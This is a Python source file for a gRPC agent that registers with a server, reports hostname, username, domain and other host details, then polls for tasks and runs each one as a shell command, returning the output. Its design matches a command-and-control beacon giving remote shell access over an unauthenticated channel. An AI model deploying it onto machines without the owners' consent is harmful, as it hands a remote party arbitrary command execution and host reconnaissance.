import grpc
import platform
import uuid
import os
import socket
import time
import subprocess
from datetime import datetime

# Import the generated gRPC code
from protos import agent_pb2
from protos import agent_pb2_grpc

class Agent:
    def __init__(self, server_address):
        self.server_address = server_address
        self.agent_id = str(uuid.uuid4())
        self.channel = grpc.insecure_channel(server_address)
        self.stub = agent_pb2_grpc.AgentServiceStub(self.channel)
        
    def get_system_info(self):
        return agent_pb2.SystemInfo(
            hostname=socket.gethostname(),
            username=os.getenv('USERNAME') or os.getenv('USER'),
            os=platform.system(),
            arch=platform.machine(),
            pid=str(os.getpid()),
            domain=socket.getfqdn(),
            agent_id=self.agent_id
        )
    
    def register(self):
        try:
            response = self.stub.Register(self.get_system_info())
            print(f"Registration: {response.message}")
            return response.success
        except grpc.RpcError as e:
            print(f"Failed to register: {e}")
            return False
    
    def checkin(self):
        try:
            request = agent_pb2.CheckinRequest(agent_id=self.agent_id)
            response = self.stub.Checkin(request)
            return response.has_tasks
        except grpc.RpcError as e:
            print(f"Checkin failed: {e}")
            return False
    
    def get_tasks(self):
        try:
            request = agent_pb2.TaskRequest(agent_id=self.agent_id)
            response = self.stub.GetTasks(request)
            return response.tasks
        except grpc.RpcError as e:
            print(f"Failed to get tasks: {e}")
            return []
    
    def execute_command(self, command):
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()
            
            if process.returncode == 0:
                return True, stdout
            else:
                return False, stderr
        except Exception as e:
            return False, str(e)
    
    def send_result(self, task_id, success, output):
        try:
            result = agent_pb2.TaskResult(
                task_id=task_id,
                output=output,
                status="success" if success else "error",
                error=None if success else output,
                agent_id=self.agent_id
            )
            response = self.stub.SendResult(result)
            return response.success
        except grpc.RpcError as e:
            print(f"Failed to send result: {e}")
            return False
    
    def run(self):
        if not self.register():
            print("Failed to register with server")
            return
        
        print(f"Agent registered successfully with ID: {self.agent_id}")
        
        while True:
            try:
                if self.checkin():
                    tasks = self.get_tasks()
                    for task in tasks:
                        print(f"Executing task {task.id}: {task.command}")
                        success, output = self.execute_command(task.command)
                        self.send_result(task.id, success, output)
                
                time.sleep(5)  # Wait 5 seconds before next checkin
                
            except KeyboardInterrupt:
                print("\nAgent shutting down...")
                break
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(10)  # Wait longer on error

def main():
    import argparse
    parser = argparse.ArgumentParser(description='GRPC Agent')
    parser.add_argument('--server', default='localhost:50051',
                      help='The server address in format host:port')
    args = parser.parse_args()
    
    agent = Agent(args.server)
    agent.run()

if __name__ == '__main__':
    main() 